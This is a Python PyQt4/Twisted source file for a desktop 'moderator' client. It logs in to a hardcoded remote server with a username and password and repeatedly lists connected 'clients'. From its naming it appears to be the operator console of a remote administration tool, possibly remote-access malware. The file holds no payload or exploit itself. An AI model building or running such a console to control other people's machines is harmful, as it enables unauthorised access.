# -*- coding: utf-8 -*-

import sys
import os
import string
import random

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ModeratorFactory import *

from libs.language import Translate
from libs.gui import tables, main
from ui import gui

SERVER_HOST = '109.172.189.74'
#SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1313


# Initial Folders
assets = os.path.join(os.path.dirname(sys.argv[0]), 'assets')
flags = os.path.join(assets, 'flags')
plugins = os.path.join(os.path.dirname(sys.argv[0]), 'plugins')

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

# Main Window
class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, reactor, parent=None):
        super(MainDialog, self).__init__(parent)
        self.reactor = reactor
        self.setupUi(self)

        # Create Protocol
        self.create_moderator()
        # Create Tables UI
        self.tables = tables.updateClientsTable(self, assets)
        # Create Main UI Functions
        self.ui = main.updateUi(self)

        # Init Modes
        self.modes = {
            'moderatorInitializing': self.moderatorInitializing,
            'getClients': self.getClients,
        }

    def create_moderator(self):
        self.moderator = SocketModeratorFactory(
            self.on_moderator_connect_success,
            self.on_moderator_connect_fail,
            self.on_moderator_receive)

    # Start Connect To Server
    def on_connect_to_server(self):
        self.connection = self.reactor.connectTCP(SERVER_HOST, SERVER_PORT, self.moderator)

    # Connected To Server
    def on_moderator_connect_success(self):
        self.session_id = id_generator(size=24)
        username, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'), QLineEdit.Normal)
        if ok:
            password, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
            if ok:
                self.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing', session_id=self.session_id)
            else:
                self.main.on_moderator_connected()
        else:
            self.main.on_moderator_not_connected()

    # Disconnected From Server
    def on_moderator_connect_fail(self, reason):
        self.connection.close()
        # reason is a twisted.python.failure.Failure  object
        print 'cann\'t connect. reason: %s' % reason

    # Callbacks
    def on_moderator_receive(self, data):
        if type(data) is dict:
            if self.modes.has_key(data['mode']):
                self.modes[data['mode']](data)
            # TODO: DEBUG
            else:
                print 'UNKNOWN MODE [%s]' % data['mode']

    # CALLBACKS
    # Moderator Login Callback
    def moderatorInitializing(self, data):
        """ Initializing Moderator """
        if data['payload'].startswith('loginSuccess '):
            # Get Privileges
            self.privs = int(data['payload'].split()[-1])
            if self.privs == 1: self.ui.enable_administrator()
            else: self.ui.disable_administrator()
            # Start Client Checker
            self.clients_checker = QTimer()
            self.clients_checker.timeout.connect(self.check_clients)
            self.clients_checker.start(500)
            # Update UI
            self.ui.on_moderator_connected()
        else:
            # Update UI
            self.ui.on_moderator_not_connected()
            # Warn Message
            warn = QMessageBox(QMessageBox.Warning, _('INCORRECT_CREDENTIALS'), _('INCORRECT_CREDENTIALS'))
            ans = warn.exec_()

    def getClients(self, data):
        '''
        Update Clients Information
        :param data:
        :return:
        '''
        self.tables.update_clients(data)

    # get online client
    def current_client(self):
        try:
            return str(self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_id).text())
        except AttributeError:
            return False

    # get offline client
    def current_offline_client(self):
        try:
            return str(self.offlineClientsTable.item(self.offlineClientsTable.currentRow(), 2).text())
        except AttributeError:
            return False

    # Check Clients For Updates
    def check_clients(self):
        self.moderator.send_msg(message='getClients', mode='getClients', session_id=self.session_id)

#-------------------------------------------------------------------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    try:
        import qt4reactor
    except ImportError:
        from twisted.internet import qt4reactor
    qt4reactor.install()

    from twisted.internet import reactor
    moderatWindow = MainDialog(reactor)
    moderatWindow.show()

    reactor.run()